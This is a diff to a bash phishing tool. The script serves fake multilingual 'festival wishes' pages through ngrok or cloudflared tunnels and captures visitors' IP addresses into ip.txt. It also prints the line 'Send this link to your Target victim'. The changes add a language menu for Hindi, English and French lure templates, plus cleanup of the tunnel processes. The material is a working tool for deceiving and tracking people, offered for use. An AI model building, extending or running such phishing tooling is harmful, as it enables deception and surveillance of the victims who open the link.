@@ -89,15 +89,15 @@ sleep 0.02
 #<<<----------PROGRAM---------->>>
 processbar()
 {
-   bar=" #######################################################"
-   barlenght=${#bar}
-   i=o
-   while ((i < 100 )); do
-           n=$((i*barlenght / 100 ))
-           printf "\e[00;35m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
-           ((i += RANDOM%5+2))
-           sleep 0.01
-   done
+  bar=" #######################################################"
+  barlenght=${#bar}
+  i=o
+  while ((i < 100 )); do
+    n=$((i*barlenght / 100 ))
+    printf "\e[00;35m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
+    ((i += RANDOM%5+2))
+    sleep 0.01
+  done
 }
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
@@ -107,16 +107,18 @@ command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not inst
 stop() {
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
+checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
   pkill -f -2 ngrok > /dev/null 2>&1
   killall -2 ngrok > /dev/null 2>&1
 fi
-
+if [[ $checkcloudflared == *'cloudflare'* ]]; then
+  pkill -f -2 $checkcloudflared > /dev/null 2>&1
+  killall -2 $checkcloudflared > /dev/null 2>&1
+fi
 if [[ $checkphp == *'php'* ]]; then
   killall -2 php > /dev/null 2>&1
 fi
-
-exit 1
 }
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
@@ -146,7 +148,21 @@ done
 payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://wishyou-@[-0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' template.php > index.php
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+'$link'+g' festivalwishesHindi.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+rm -rf index3.html
+}
+payload_ngrok1() {
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://wishyou-@[-0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+'$link'+g' festivalwishesEnglish.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+rm -rf index3.html
+}
+payload_ngrok2() {
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://wishyou-@[-0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+'$link'+g' festivalwishesFrench.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 rm -rf index3.html
 }
@@ -157,7 +173,25 @@ fest_name="${fest_name//[[:space:]]/}"
 }
 
 ngrok_server() {
-echo
+echo -e "
+${S2}=========================${R0}
+    ${B1}Select Language:-${G0}
+${S3}-------------------------${R0}
+
+${S2}(${S6}01${S2})${S4}Hindi${R0}
+${S2}(${S6}02${S2})${S4}English${R0}
+${S2}(${S6}03${S2})${S4}French${R0}
+" | pv -qL 1000
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}Enter(${S1}server${S7})> ${R0}"
+read lang
+if [[ $lang == '1' || $lang == '01' || $lang == '2' || $lang == '02' || $lang == '3' || $lang == "03" ]]; then
+break
+else
+printf "${S7}[${S1}!${S7}]${S1} Please enter a valid option!!${R0}\n"
+fi
+done
+
 echo -e "
 ${S2}=========================${R0}
      ${B1}Server options:-${G0}
@@ -248,7 +282,13 @@ echo -e "
 echo; wait
 printf "${S4}${R0}${S4} Send this link to your Target victim :${R0}${D0} %s${R0}\n" https://$link
 wait
+if [[ $lang == '1' || $lang == "01" ]]; then
 payload_ngrok
+elif [[ $lang == '2' || $lang == '02' ]]; then
+payload_ngrok1
+else
+payload_ngrok2
+fi
 checkfound
 }
 phish() {
